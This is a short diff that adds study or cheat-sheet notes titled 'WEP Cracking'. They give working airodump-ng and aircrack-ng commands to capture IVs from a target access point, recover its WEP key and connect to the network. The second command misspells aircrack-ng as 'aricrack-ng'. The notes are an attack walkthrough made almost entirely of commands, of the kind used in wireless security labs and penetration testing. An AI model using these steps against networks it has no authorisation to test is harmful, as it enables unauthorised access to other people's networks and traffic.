@@ -1,0 +1,6 @@
+1. WEP Cracking
+  Step 1: Capture a large number of packets/IVs (airodump-ng)
+   >> airodump-ng --bssid [BSSID] --channel [CH] --write wep_basic mon0
+  Step 2: Analyse the captured IVs and crack the key (aircrack-ng)
+   >> aricrack-ng wep_basic*.cap
+  Step 3: Copy the key and remove ":" then connect the network
